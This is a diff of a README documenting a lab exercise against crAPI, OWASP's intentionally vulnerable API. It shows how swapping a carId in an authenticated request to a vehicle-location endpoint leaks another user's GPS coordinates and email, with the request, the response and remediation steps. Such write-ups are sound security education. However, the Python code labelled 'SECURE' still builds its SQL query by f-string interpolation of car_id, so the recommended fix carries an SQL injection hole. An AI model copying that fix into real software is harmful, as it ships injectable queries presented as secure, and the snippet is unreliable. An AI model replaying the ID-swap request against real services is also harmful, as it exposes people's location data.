@@ -1,43 +1,130 @@
-Project Overview
-This project demonstrates the discovery and exploitation of a Broken Object Level Authorization (BOLA)—also known as Insecure Direct Object Reference (IDOR)—vulnerability within the crAPI (Completely Ridiculous API) ecosystem. By analyzing API requests and gathering target information via community features, an authenticated user can access private location data and personal details of other registered users.
+<div align="center">
 
-Technical Description of the Attack
-The attack was executed in three primary phases: Information Gathering, Traffic Analysis, and Exploitation.
+```
+██████╗  ██████╗ ██╗      █████╗     ██╗██████╗  ██████╗ ██████╗ 
+██╔══██╗██╔═══██╗██║     ██╔══██╗    ██║██╔══██╗██╔═══██╗██╔══██╗
+██████╔╝██║   ██║██║     ███████║    ██║██║  ██║██║   ██║██████╔╝
+██╔══██╗██║   ██║██║     ██╔══██║    ██║██║  ██║██║   ██║██╔══██╗
+██████╔╝╚██████╔╝███████╗██║  ██║    ██║██████╔╝╚██████╔╝██║  ██║
+╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝
+```
 
-1. Information Gathering
-Target Identification: Navigated to the crAPI Community Forum (/forum) to find potential target users.
+# 🔓 BOLA / IDOR Vulnerability — crAPI Security Research
 
-Target Selection: Identified a user named Pogba who had active posts on the platform.
+**Broken Object Level Authorization (BOLA) | Insecure Direct Object Reference (IDOR)**
 
-2. Traffic Analysis
-Interception: Used Burp Suite Community Edition to capture legitimate API traffic on the dashboard.
+![Severity](https://img.shields.io/badge/Severity-HIGH-red?style=for-the-badge&logo=shield)
+![OWASP](https://img.shields.io/badge/OWASP-API1%3A2023-orange?style=for-the-badge)
+![Platform](https://img.shields.io/badge/Target-crAPI-blueviolet?style=for-the-badge)
+![Tool](https://img.shields.io/badge/Tool-Burp%20Suite-ff6633?style=for-the-badge&logo=burpsuite)
+![Status](https://img.shields.io/badge/Status-Documented-brightgreen?style=for-the-badge)
 
-Endpoint Discovery: Located the vehicle details page, which triggers a GET request to retrieve the current user's vehicle location via the following API endpoint structure:
+> *Demonstrating how a missing object-level authorization check allows any authenticated user to access private GPS coordinates, full name, and email address of any other registered user.*
+
+</div>
+
+---
+
+## 📋 Table of Contents
+
+- [🔍 Project Overview](#-project-overview)
+- [⚙️ Technical Description](#️-technical-description)
+  - [Phase 1 — Information Gathering](#phase-1--information-gathering)
+  - [Phase 2 — Traffic Analysis](#phase-2--traffic-analysis)
+  - [Phase 3 — Exploitation](#phase-3--exploitation)
+- [💥 Exploit Proof of Concept](#-exploit-proof-of-concept)
+- [🛡️ Remediation & Mitigation](#️-remediation--mitigation)
+- [🧰 Environment & Tools](#-environment--tools)
+
+---
+
+## 🔍 Project Overview
+
+This project demonstrates the discovery and exploitation of a **Broken Object Level Authorization (BOLA)** vulnerability — also known as an **Insecure Direct Object Reference (IDOR)** — within the **crAPI (Completely Ridiculous API)** ecosystem.
+
+By analyzing API traffic and gathering target information via community features, an authenticated user can access **private location data and personal details** of other registered users — without any special privileges.
+
+> ⚠️ **Disclaimer:** This research was performed in a controlled, intentionally vulnerable lab environment (crAPI). All techniques are documented for **educational purposes only**.
+
+---
+
+## ⚙️ Technical Description
+
+The attack was executed in three primary phases: **Information Gathering**, **Traffic Analysis**, and **Exploitation**.
+
+---
+
+### Phase 1 — Information Gathering
+
+```
+[ crAPI Forum ]  →  Identify active users  →  Select target
+```
+
+| Step | Action | Detail |
+|------|--------|--------|
+| 1️⃣ | Navigate to Community Forum | Accessed `/forum` to enumerate active platform users |
+| 2️⃣ | Target Identification | Found user **`Pogba`** with active posts on the platform |
+| 3️⃣ | Context Harvesting | Retrieved target's `carId` from API/forum response data |
+
+---
+
+### Phase 2 — Traffic Analysis
+
+```
+[ Browser ]  →  Burp Suite Proxy  →  Intercept  →  Analyze
+```
+
+| Step | Action | Detail |
+|------|--------|--------|
+| 🔎 | Intercept Traffic | Captured legitimate API requests via **Burp Suite Community Edition** |
+| 📍 | Endpoint Discovery | Located the vehicle location endpoint triggered from the dashboard |
+| 🔑 | Auth Mechanism | Requests use a standard `Authorization: Bearer <JWT>` token |
+| ⚠️ | Flaw Identified | Backend **does not validate** if the JWT owner matches the requested `carId` |
+
+**Vulnerable Endpoint Structure:**
+```
 GET /identity/api/v2/vehicle/<carId>/location
+```
 
-Authentication: The request utilizes a standard Bearer Token (Authorization: Bearer <JWT>) for user authentication. However, the backend fails to validate if the authenticated user actually owns the requested <carId>.
+---
 
-3. Exploitation (BOLA / IDOR)
-Request Manipulation: Sent the legitimate location request to Burp Repeater.
+### Phase 3 — Exploitation
 
-IDOR Execution: Swapped out the original user's carId with the target user's (Pogba) carId (retrieved from the API/forum context: cd515c12-0fc1-48ae-8b61-9230b70a845b).
+```
+[ Legitimate Request ]  →  Burp Repeater  →  Swap carId  →  Data Leak ✓
+```
 
-Data Leakage: The server responded with a 200 OK, exposing Pogba's sensitive information:
+| Step | Action | Detail |
+|------|--------|--------|
+| 1️⃣ | Capture Request | Sent legitimate location request to **Burp Repeater** |
+| 2️⃣ | Modify Parameter | Replaced own `carId` with Pogba's `carId` |
+| 3️⃣ | Execute Request | Sent modified request — server responded with `200 OK` |
+| 4️⃣ | Data Exposed | Retrieved Pogba's GPS coordinates, full name, and email |
 
-GPS Coordinates: Latitude (31.284788), Longitude (-92.471176)
+**Target `carId` used:**
+```
+cd515c12-0fc1-48ae-8b61-9230b70a845b
+```
 
-Full Name: Pogba
+---
 
-Email Address: pogbaU06@example.com
+## 💥 Exploit Proof of Concept
 
-Exploit Proof of Concept (PoC)
-Vulnerable Endpoint
-HTTP
-GET /identity/api/v2/vehicle/{car_id}/location HTTP/1.1
+### 🔴 Request — Manipulated API Call
+
+```http
+GET /identity/api/v2/vehicle/cd515c12-0fc1-48ae-8b61-9230b70a845b/location HTTP/1.1
 Host: localhost:8888
 Authorization: Bearer [Your_JWT_Token]
-Response (Data Leak)
-JSON
+```
+
+> The only change from a legitimate request is the **substituted `carId`** in the URL path. The JWT token belongs to a completely different user.
+
+---
+
+### 🟢 Response — Sensitive Data Leak (`200 OK`)
+
+```json
 {
   "carId": "cd515c12-0fc1-48ae-8b61-9230b70a845b",
   "vehicleLocation": {
@@ -48,18 +135,103 @@ JSON
   "fullName": "Pogba",
   "email": "pogbaU06@example.com"
 }
-Remediation & Mitigation
-To secure this endpoint against BOLA/IDOR attacks, implement the following controls:
+```
 
-Object-Level Access Control: Implement an authorization check on the backend to verify that the carId specified in the URL path belongs explicitly to the user ID extracted from the validated JWT token.
+### 📊 Exposed Data Summary
 
-Use Non-Sequential/Non-Leaked Identifiers: While crAPI uses UUIDs, ensure that asset IDs are not leaked unnecessarily through public endpoints like the community forum.
+| Data Field | Value | Sensitivity |
+|------------|-------|-------------|
+| 🗺️ Latitude | `31.284788` | 🔴 High |
+| 🗺️ Longitude | `-92.471176` | 🔴 High |
+| 👤 Full Name | `Pogba` | 🟠 Medium |
+| 📧 Email Address | `pogbaU06@example.com` | 🔴 High |
 
-Principle of Least Privilege: Ensure the API endpoint only returns the data necessary for the request. If only the location is needed, do not include the owner's full name and email address in the JSON payload response.
+---
 
-Environment & Tools Used
-Target Application: crAPI (Completely Ridiculous API) hosted on localhost:8888
+## 🛡️ Remediation & Mitigation
 
-Interception Proxy: Burp Suite Community Edition v2026.4.3
+### Fix 1 — Implement Object-Level Access Control ⭐ Critical
 
-Mail Server: MailHog (for monitoring local registration/token mail flows)
+```python
+# VULNERABLE — No ownership check
+def get_vehicle_location(car_id):
+    return db.query(f"SELECT * FROM vehicles WHERE car_id = '{car_id}'")
+
+# SECURE — Validate JWT owner matches vehicle owner
+def get_vehicle_location(car_id, jwt_user_id):
+    vehicle = db.query(f"SELECT * FROM vehicles WHERE car_id = '{car_id}'")
+    if vehicle.owner_id != jwt_user_id:
+        raise ForbiddenException("Access denied: you do not own this vehicle.")
+    return vehicle.location
+```
+
+> On every request, extract the `user_id` from the validated JWT and verify it matches the vehicle's registered owner **before** returning any data.
+
+---
+
+### Fix 2 — Minimize ID Exposure in Public Endpoints
+
+```diff
+- Community Forum API Response:
+-   { "post": "...", "author": "Pogba", "carId": "cd515c12-..." }
+
++ Community Forum API Response:
++   { "post": "...", "author": "Pogba" }
+```
+
+> Asset identifiers like `carId` should **never** be unnecessarily leaked through public or low-privilege endpoints such as community forums.
+
+---
+
+### Fix 3 — Apply Principle of Least Privilege
+
+```diff
+- Location Endpoint Response (Current):
+-   { "carId": "...", "vehicleLocation": {...}, "fullName": "Pogba", "email": "pogbaU06@example.com" }
+
++ Location Endpoint Response (Hardened):
++   { "vehicleLocation": { "latitude": "...", "longitude": "..." } }
+```
+
+> If the endpoint's purpose is to return **location data**, it should return **only location data** — not the owner's PII.
+
+---
+
+### 🗂️ Remediation Checklist
+
+- [ ] Add ownership validation against JWT `user_id` on all object-level endpoints
+- [ ] Audit all API endpoints that accept user-supplied resource IDs
+- [ ] Remove `carId` and other asset identifiers from public/community API responses
+- [ ] Strip PII from API responses that do not explicitly require it
+- [ ] Implement automated BOLA testing in your CI/CD security pipeline
+
+---
+
+## 🧰 Environment & Tools
+
+| Component | Details |
+|-----------|---------|
+| 🎯 **Target Application** | crAPI (Completely Ridiculous API) — `localhost:8888` |
+| 🕵️ **Interception Proxy** | Burp Suite Community Edition `v2026.4.3` |
+| 📬 **Mail Server** | MailHog (local registration & token mail monitoring) |
+| 🔐 **Auth Mechanism** | JWT Bearer Token (`Authorization: Bearer <token>`) |
+| 🆔 **Identifier Type** | UUID v4 (not sequential, but leaked via forum) |
+
+---
+
+## 📚 References
+
+- [OWASP API Security Top 10 — API1:2023 Broken Object Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)
+- [crAPI — Completely Ridiculous API (OWASP Lab)](https://github.com/OWASP/crAPI)
+- [PortSwigger — Insecure Direct Object References (IDOR)](https://portswigger.net/web-security/access-control/idor)
+
+---
+
+<div align="center">
+
+*Researched and documented for educational purposes in a controlled lab environment.*
+
+![Made with](https://img.shields.io/badge/Made%20with-❤️%20%26%20Burp%20Suite-ff6633?style=flat-square)
+![OWASP](https://img.shields.io/badge/OWASP-crAPI%20Lab-blue?style=flat-square)
+
+</div>
